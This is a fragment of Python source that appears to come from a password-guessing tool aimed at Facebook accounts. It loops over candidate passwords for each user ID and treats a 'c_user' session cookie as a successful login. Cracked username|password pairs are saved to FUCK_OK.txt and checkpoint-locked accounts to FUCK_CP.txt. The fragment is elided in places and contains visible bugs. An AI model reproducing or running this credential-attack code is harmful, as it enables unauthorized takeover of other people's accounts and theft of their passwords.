...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mFUCK_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mFUCK_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back FUCK Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[FUCK-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [FUCK-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('FUCK_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [FUCK-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('FUCK_CP.txt' , 'a').write('%s\n' % wrt)
                        break
